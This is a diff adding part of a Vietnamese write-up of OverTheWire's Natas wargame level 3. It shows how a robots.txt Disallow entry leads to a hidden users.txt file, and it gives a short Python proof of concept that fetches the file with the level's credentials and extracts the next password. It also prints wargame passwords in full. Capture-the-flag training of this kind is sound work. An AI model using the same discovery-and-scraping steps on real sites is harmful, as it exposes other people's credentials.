@@ -131,3 +131,33 @@ Vì thế ta thử check file *robots.txt* trên trang web ([http://natas3.natas
 User-agent: *
 Disallow: /s3cr3t/
 ```
+
+Duyệt folder trên url, và check file **users.txt**:
+
+```bash
+natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+```
+
+**POC:**
+```Python
+import requests
+import re
+
+user = 'natas3'
+pwd = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
+
+url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % user
+reponse = requests.get(url,auth = (user,pwd))
+content = reponse.text
+
+#print(content)
+print(re.findall('natas4:(.*)', content))
+```
+
+
+
+***
+# Natas Level 3 Solution
+***
+**URL:** [http://natas3.natas.labs.overthewire.org](http://natas3.natas.labs.overthewire.org) <br/>
+**Datum:** natas4-Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
